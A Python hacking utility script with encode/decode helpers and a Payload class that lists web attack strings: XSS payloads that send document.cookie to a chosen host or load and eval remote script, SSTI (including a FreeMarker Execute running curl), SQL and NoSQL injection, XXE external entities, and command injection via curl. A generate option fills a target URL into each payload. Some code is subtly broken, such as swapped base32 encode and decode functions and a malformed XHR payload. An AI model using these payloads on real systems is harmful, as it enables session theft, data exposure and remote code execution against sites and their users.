#!/bin/python3
import numpy as np 
import pandas as pd
import pyarrow.parquet as pq

import base64 
import urllib
import string
import html
import re

class Decode:
    def b32(self, user_in):
        return base64.b32encode(user_in).decode("utf-8")

    def b64(self, user_in):
        return base64.b64decode(user_in).decode("utf-8")

    def b64url(self, user_in):
        return base64.urlsafe_b64decode(user_in).decode("utf-8")

    def url(self, user_in):
        return urllib.parse.unquote_plus(user_in)
    
    def html(self, user_in):
        return html.unescape(user_in)
    
    def hex(self, user_in):
        try:
            #strip 0x
            if user_in.startswith("0x"):
                data = user_in[2:].upper()
            else:
                data = user_in.upper()

            return base64.b16decode(data).decode("utf-8")
        except Exception as e:
            return F"Input was of type: {type(user_in)}, but type(string) is required!\nThe format expected is: '0x12'.\nError: {e}"

    def hexint(self, user_in):
        try:
            return int(user_in, 16)
        except Exception as e:
            return F"Input was: {type(user_in)}, but type hex string is required!\nError: {e}"
    
    # needs work
    # Want it to print "unprintable" characters using representation ( repr()? )
    # e.g. 0x0a = \n
    def hexweb(self, user_in):
        data = user_in.split(r"\x")
        data = data[1:]
        hexstring = "0x" + "".join(data)
        decode = self.hex(hexstring)
        out = ""
        for char in decode:
            if char.isprintable():
                out += char
            else:
                chr = repr(char).strip("'")
                out += chr.strip("\"")
                #out += r'\x{0:02x}'.format(ord(char))
        return out

class Encode:
    def b32(self, user_in):
        return base64.b32decode(user_in).decode("utf-8")

    def b64(self, user_in):
        return base64.b64encode(user_in).decode("utf-8")

    def b64url(self, user_in):
        return base64.urlsafe_b64encode(user_in).decode("utf-8")

    def url(self, user_in):
        return urllib.parse.quote_plus(user_in)
    
    def html(self, user_in):
        return html.escape(user_in)
    
    # First try to handle as int. If error, fallback to string
    def hex(self, user_in):
        try:
            return "0x"+bytes.hex(user_in.encode("utf-8"))
        # Also cannot convert from text to hex
        except Exception as e:
            return F"Input was: {user_in}, but hex string is required!\nError: {e}"
    
    def hexint(self, user_in):
        try:
            inp = int(user_in)
            if isinstance(inp, int):
                return hex(inp)
        # Cannot cast to int or convert to hex
        except Exception as e:
            return F"Input was: {type(user_in)}, but type int is required!\nError: {e}"

    def hexweb(self, user_in):
        prepend=r"\x"
        data = self.hex(user_in).strip("0x")
        # for 2entries in data, add \x and make one string
        split = [data[i:i+2] for i in range(0,len(data), 2)]
        res = "".join([F"{prepend}{ent}" for ent in split])
        return res

class Analyze:
    def parquet(self, user_in):
        try:
            return (F"Data:\n{pq.read_table(user_in)}")
        except Exception as e:
            return (F"Could not decode file: {user_in} into parquet file format.\nError: {e}")


class Payload:
    
    placeholder = "|placeholder|"
    payloads = [
        # basic
        "<s> hi {*hi*} {{ 7*7 }} ${7*7} ${{<%[%\'\"}}%\.",
        # HTML
        F"<meta http-equiv=\"refresh\" content=\"0; url={placeholder}\" />",
        # js
        "<img src=x onerror=alert(document.domain) />",
        F"<script>console.log('Domain: ' + document.domain + 'Origin: ' + window.origin))</script>",
        "<scr<script>ipt>alert(document.domain)</scr<script>ipt>",
        "\"><script>alert(document.domain)</script>",
        "<svgonload=alert(document.domain)>",
        "java%0ascript:alert(document.domain)",
        "<object onbeforescriptexecute=confirm(document.domain)>",
        F"<img src=x onerror=this.src='{placeholder}?cookie='+document.cookie>",
        F"\"><script src={placeholder}></script>",
        F"<script>let d=new XMLHttpRequest();d.open(\"GET\",\"{placeholder}\");d.send()</script>",
        F"$.get({placeholder})",
        F"fetch({placeholder})",
        F"<script>function b(){{eval(this.responseText)}};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\GET\, \"//{placeholder}\");a.send();",
        "[a](javascript:prompt(document.cookie)) - Markdown",
        # SSTI
        "${"+placeholder+"}",
        "#{"+placeholder+"}",
        "@{"+placeholder+"}",
        F"@({placeholder})",
        F"[=\"freemarker.template.utility.Execute\"?new()(\"curl {placeholder}\")]",
        "{{"+placeholder+"}}",
        "*{"+placeholder+"}",
        "~{"+placeholder+"}",
        "${{"+placeholder+"}}",
        F"[[{placeholder}]]",
        F"<% {placeholder} %>",
        # SQLi
        "1 or 1=1 -- -",
        "1' or 1=1",
        "1\" or 1=1",
        #NoSQL
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        "true, $where: '1 == 1'",
        # XXE
        "<!--?xml version=\"1.0\" ?-->\n<!DOCTYPE replace [<!ENTITY example 'Doe'> ]>\n <userInfo>\n  <firstName>John</firstName>\n  <lastName>&example;</lastName>\n </userInfo>\n",
        F"<!ENTITY % xxe PUBLIC 'Random Text' '{placeholder}'>",
        F"<!ENTITY xxe PUBLIC 'Any TEXT' '{placeholder}'>",
        F"<?xml version=\"1.0\" ?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"{placeholder}\"> %ext;\n]>\n<r></r>",
        F"<!DOCTYPE root [<!ENTITY test SYSTEM '{placeholder}'>]>\n<root>&test;</root>",
        # CMD Injection
        F"`curl {placeholder}`",
        F";curl {placeholder}",
        F";curl$IFS{placeholder}",
        F";{{curl,{placeholder}}}",
        F"$(curl {placeholder})",
    ]

    def list(self):
        all = ""
        x = 0
        all += "Payloads:\n" 
        for pl in self.payloads:
            all += F"{x}: {pl}\n"
            x += 1
        return all
    
    def generate(self, target):
        all = ""
        x = 0
        all += F"Payloads for {target}:\n"
        for pl in self.payloads:
            real_pl = pl.replace(self.placeholder, target)
            all += F"{x}: {real_pl}\n"
            x += 1
        return all

if __name__ == "__main__":
    import argparse
    import inspect

    def generate_parser(parser, methods):
        for m in methods:
            parser.add_argument(F"-{m[0]}", help=F"Decode a {m[0]} encoded string", nargs=1, metavar="data")

    pl = Payload()
    dc = Decode()
    enc = Encode()
    an = Analyze()

    parser = argparse.ArgumentParser(
        usage="%(prog)s [OPTION]",
        description="Utility tools for hacking!",
        add_help=True
    )

    # hackutil.py - -b64 base64string
    subparsers = parser.add_subparsers(required=True)

    # Payload parser
    parser_pl = subparsers.add_parser("payload", help="Payload related functions", aliases=["p", "pl"])
    parser_pl.add_argument("-l", "--list", help="List all payloads", action="store_true")
    parser_pl.add_argument("-g", "--generate", help="Generate payloads using the given input as the active part (e.g. URL)", nargs=1, metavar="URL")
    parser_pl.set_defaults(func='payload')
    
    # Analyze parser
    parser_an = subparsers.add_parser("analyze", help="Analyze the input (usually a file) using different techniques", aliases=["a", "analyze"])
    parser_an.add_argument("-pq", "--parquet", help="Parse parquet input-file", nargs=1, metavar="in_file")
    parser_an.set_defaults(func='analyze')

    # Decoder parser
    parser_dec = subparsers.add_parser("decode", help="Decoding input using different algorithms", aliases=["d", "decode"])
    parser_dec.set_defaults(func='decode')
    # Encoder parser
    parser_enc = subparsers.add_parser("encode", help="Encoding input using different algorithms", aliases=["e", "enc", "encode"])
    parser_enc.set_defaults(func='encode')

    method_list = inspect.getmembers(enc, predicate=inspect.ismethod)
    generate_parser(parser_enc, method_list)
    generate_parser(parser_dec, method_list)
    
    args = parser.parse_args()

    
    func = args.func
    res = ""
    if func == "encode":
        if args.b32:
            res = enc.b32(args.b32[0].encode("utf-8"))
        if args.b64:
            res = enc.b64(args.b64[0].encode("utf-8"))
        if args.b64url:
            res = enc.b64url(args.b64url[0].encode("utf-8"))
        if args.url:
            res = enc.url(args.url[0])
        if args.html:
            res = enc.html(args.html[0])
        if args.hex:
            res = enc.hex(args.hex[0])
        if args.hexint:
            res = enc.hexint(args.hexint[0])
        if args.hexweb:
            res = enc.hexweb(args.hexweb[0])

    if func == "decode":
        if args.b32:
            res = dc.b32(args.b32[0])
        if args.b64:
            res = dc.b64(args.b64[0])
        if args.b64url:
            res = dc.b64url(args.b64url[0])
        if args.url:
            res = dc.url(args.url[0])
        if args.html:
            res = dc.html(args.html[0])
        if args.hex:
            res = dc.hex(args.hex[0])
        if args.hexint:
            res = dc.hexint(args.hexint[0])
        if args.hexweb:
            res = dc.hexweb(args.hexweb[0])

    if func == "payload":
        if args.list:
            res = pl.list()
        if args.generate:
            res = pl.generate(args.generate[0])

    if func == "analyze":
        if args.parquet:
            res = an.parquet(args.parquet[0])
    

    print(res)